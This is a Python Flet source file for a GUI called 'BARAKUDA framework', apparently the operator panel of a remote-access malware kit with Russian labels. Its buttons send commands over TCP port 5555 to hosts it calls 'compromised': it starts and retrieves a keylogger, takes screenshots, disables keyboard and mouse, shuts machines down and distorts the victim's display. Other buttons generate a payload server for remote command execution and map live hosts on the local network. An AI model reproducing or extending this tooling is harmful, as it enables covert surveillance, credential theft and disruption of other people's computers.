import flet as ft
import tcp_client
import scanner
import networkx as nx
import matplotlib.pyplot as plt


def main(page: ft.Page):
    page.title = "BARAKUDA framework"

    def show_network_map(e):
        page.splash = ft.ProgressBar()
        network_btn.disabled = True
        page.update()
        waken = scanner.net_hosts()
        G = nx.Graph()
        for i in range(len(waken)):
            G.add_edge(waken[0], waken[i])
        nx.draw(G, with_labels=True)
        plt.suptitle('Сеть ОКИК')
        network_btn.disabled = False
        page.splash = None
        page.update()
        plt.show()

    def theme_changed(e):
        page.theme_mode = (
            ft.ThemeMode.DARK
            if page.theme_mode == ft.ThemeMode.LIGHT
            else ft.ThemeMode.LIGHT
        )
        theme_btn.content.icon_color = ft.colors.BLACK26 if page.theme_mode == ft.ThemeMode.LIGHT else ft.colors.AMBER_700
        page.update()

    def screenshooter(e):
        ex = tcp_client.Screenshooter(ip_address_field.value, 5555)
        ex.take_skreenshot('screenshot', tcp_client.get_my_ip())

    def hypno(e):
        ex = tcp_client.Exploitable(ip_address_field.value, 5555)
        ex.execute('hypno')

    def disable(e):
        ex = tcp_client.Exploitable(ip_address_field.value, 5555)
        ex.execute('controls')

    def poweroff(e):
        ex = tcp_client.Exploitable(ip_address_field.value, 5555)
        # poligon.show_banner()
        ex.execute('poweroff')

    def keylog(e):
        ex = tcp_client.Exploitable(ip_address_field.value, 5555)
        ex.execute('keylogger')

    def get_keylog(e):
        ex = tcp_client.Exploitable(ip_address_field.value, 5555)
        ex.execute('get_keylog')
        ex = tcp_client.Keylogger(ip_address_field.value, 5555)
        ex.get_keylog(tcp_client.get_my_ip())

    ip_address_field = ft.TextField(hint_text="IP адрес", width=180)
    BSOD_btn = ft.Container(
        content=ft.TextButton('Выключить', width=180, height=50, on_click=poweroff),
        alignment=ft.alignment.center,
    )
    keylog_btn = ft.Container(
        content=ft.TextButton('Логирование', width=180, height=50, on_click=keylog),
        alignment=ft.alignment.center,
    )
    get_keylog_btn = ft.Container(
        content=ft.TextButton('Получить', width=180, height=50, on_click=get_keylog),
        alignment=ft.alignment.center,
    )
    hypno_btn = ft.Container(
        content=ft.TextButton('Исказить', width=180, height=50, on_click=hypno),
        alignment=ft.alignment.center,
    )
    screenshooter_btn = ft.Container(
        content=ft.TextButton('Получить', width=180, height=50, on_click=screenshooter),
        alignment=ft.alignment.center,
    )
    generate_btn = ft.Container(
        content=ft.TextButton('Генерация', width=200, height=50),
        alignment=ft.alignment.center,
    )

    theme_btn = ft.Container(
        content=ft.IconButton(icon=ft.icons.LIGHTBULB, on_click=theme_changed, icon_color=ft.colors.AMBER_700),
        padding=10,
        alignment=ft.alignment.top_right,
    )

    network_btn = ft.Container(
        content=ft.TextButton("Карта сети", width=200, height=50, on_click=show_network_map),
        alignment=ft.alignment.center,
    )
    disable_btn = ft.Container(
        content=ft.TextButton("Запуск", width=200, height=50, on_click=disable),
        alignment=ft.alignment.center,
    )
    BSOD_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/skull.png', width=38, height=38),
                        title=ft.Text('Выключение'),
                        subtitle=ft.Text(
                            'Модуль выключает устройство в сети, тем самым завершая его работу. Вызывает стандартную комманду shutdown.'),
                    ),
                    ft.Row(
                        [ip_address_field, BSOD_btn],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ],
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    screenshooter_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/screenshot.png', width=38, height=38),
                        title=ft.Text('Скриншот'),
                        subtitle=ft.Text(
                            'Модуль реализует получение снимка экрана удаленного скомпроментированного устройства.'),
                    ),
                    ft.Row(
                        [ip_address_field, screenshooter_btn],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ],
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    keylogger_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/keylog.png', width=38, height=38),
                        title=ft.Text('Keylogger'),
                        subtitle=ft.Text(
                            'Модуль реализует журналирование нажатых клавишь на скомпроментированной машине.'),
                    ),
                    ft.Row(
                        [ip_address_field, keylog_btn],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ],
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    disable_controls_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/disable.png', width=38, height=38),
                        title=ft.Text('Отключить управление'),
                        subtitle=ft.Text(
                            'Модуль реализует отключение клавиатуры и мыши удаленного скомпроментированного хоста.'),
                    ),
                    ft.Row(
                        [ip_address_field, disable_btn],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ],
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    get_keylogger_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/key.png', width=38, height=38),
                        title=ft.Text('Получить keylog'),
                        subtitle=ft.Text(
                            'Модуль реализует получение журнала нажатых клавишь удаленного хоста (ref. Keylogger).'),
                    ),
                    ft.Row(
                        [ip_address_field, get_keylog_btn],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ],
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    hypno_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/hypno.png', width=38, height=38),
                        title=ft.Text('Искажения'),
                        subtitle=ft.Text(
                            'Модуль демонстрирует возможность воздействия на зрительные функции оператора.'),
                    ),
                    ft.Row(
                        [ip_address_field, hypno_btn],
                        alignment=ft.MainAxisAlignment.END,
                    )
                ]
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )
    start_server_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/flash.png', width=38, height=38),
                        title=ft.Text('Генерация сервера (payload)'),
                        subtitle=ft.Text(
                            'Модуль генерирует TCP сервер, ожидающий соединений для удаленного выполнения комманд'),
                    ),
                    ft.Row(
                        [generate_btn, ],
                        alignment=ft.MainAxisAlignment.END,

                    ),
                ]
            ),
            width=400,
            padding=10,
            alignment=ft.alignment.center,
        )
    )

    network_map_card = ft.Card(
        content=ft.Container(
            content=ft.Column(
                [
                    ft.ListTile(
                        leading=ft.Image(src='icons/network.png', width=38, height=38),
                        title=ft.Text("Построение катры сети"),
                        subtitle=ft.Text(
                            "Модуль проводит сканирование локальной сети и строит на основе 'живых' хостов ее карту."
                        ),
                    ),
                    ft.Row(
                        [network_btn, ],
                        alignment=ft.MainAxisAlignment.END,
                    ),
                ]
            ),
            width=400,
            padding=10,
        ),
    )

    page.add(
        theme_btn,
        ft.Row(
            controls=[
                network_map_card,
                start_server_card
            ],
            alignment=ft.MainAxisAlignment.CENTER,
        ),
    )

    def change_content(e):
        page.controls.clear()
        nav_dest = e.control.selected_index

        if nav_dest == 0:
            page.add(
                theme_btn,
                ft.Row(
                    controls=[
                        network_map_card,
                        start_server_card,
                    ],
                    alignment=ft.MainAxisAlignment.CENTER,
                ),

            ),

        if nav_dest == 1:
            page.add(
                theme_btn,
                ft.Row(
                    controls=[
                        hypno_card,
                        screenshooter_card,
                        BSOD_card,
                    ],
                    alignment=ft.MainAxisAlignment.CENTER,
                ),
                ft.Row(
                    controls=[
                        keylogger_card,
                        get_keylogger_card,
                        disable_controls_card,
                    ],
                    alignment=ft.MainAxisAlignment.CENTER,
                ),

            )

        if nav_dest == 2:
            page.add(theme_btn)

    page.navigation_bar = ft.NavigationBar(
        destinations=[
            ft.NavigationDestination(icon=ft.icons.TSUNAMI_OUTLINED, selected_icon=ft.icons.TSUNAMI, label="Общее"),
            ft.NavigationDestination(icon=ft.icons.DIAMOND_OUTLINED, selected_icon=ft.icons.DIAMOND,label="Эксплуатация"),
            ft.NavigationDestination(icon=ft.icons.SETTINGS, selected_icon=ft.icons.SETTINGS, label="Настройки")
        ],
        on_change=change_content
    )

    page.update()


ft.app(target=main, assets_dir="assets")
